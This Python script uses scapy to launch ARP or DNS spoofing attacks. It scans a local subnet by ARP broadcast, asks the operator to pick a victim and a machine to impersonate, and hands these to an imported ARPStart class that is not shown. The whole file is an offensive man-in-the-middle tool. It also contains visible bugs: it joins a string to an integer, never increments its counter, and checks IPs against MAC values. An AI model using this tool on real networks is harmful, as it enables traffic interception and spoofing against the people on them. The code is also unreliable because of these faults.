from scapy.all import * 
from ARPStart import ARPStart

machinesDict = {}
allVictims = []
allSpoofs = []

typeOfAttack = input("Enter the type of attack you want to start [arp/dns]:\t")

networkID = input("Enter the network interface (e.g.: enp0s3):\t")
print("==========================================================")
print("\t\tScanning the network")
print("==========================================================")

str_to_display = "Networks that you can attack: \n\n"
answeredMachines, unansweredMachines = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.56.0-255"), timeout=2, iface=networkID, verbose=False)
count = 1
for i, j in answeredMachines:
    machinesDict.update({j[ARP].psrc : j[ARP].hwsrc})
    str_to_display += "(" + count + ".) " + " IP address: " + j[ARP].psrc + " MAC address: " + j[ARP].hwsrc + "\n"

print(str_to_display)
ipVictim = ""
while ipVictim not in machinesDict.keys():
    ipVictim = input("Enter the IP address of the machine that you want to attack (e.g.: 192.168.56.101):\t")
    if ipVictim in machinesDict.values():
        allVictims.append(ipVictim)
    else:
        print("The IP of this machine is not in the available machines list.")

ipSpoof = ""
while ipSpoof not in machinesDict.keys():    
    ipSpoof = input("Enter the IP address of the spoof machine (e.g.: 192.168.56.102):\t")
    if ipSpoof in machinesDict.values() and ipSpoof not in allVictims:
        allSpoofs.append(ipSpoof)
    else:
        print("The IP of this machine is not in the available machines list.")

silentMode = input("Silent mode? [y/n]")
silentModeChoice = False
if silentMode == "y":
    silentModeChoice = True
elif silentMode == "n":
    silentModeChoice = False
else:
    print("You have entered an invalid option. Silent mode is defaulted at False. This is how we will continue the attack.")

if typeOfAttack == "arp":
    if silentModeChoice:
        print("Starting ARP in silent mode = True, MITM ARP.")
    else:
        print("Starting ARP in silent mode = False, DNS ARP.")
    arpStart = ARPStart(networkID=networkID, ipVictim=allVictims, ipSpoof=allSpoofs, silentMode=silentModeChoice)
    arpStart.startARP()
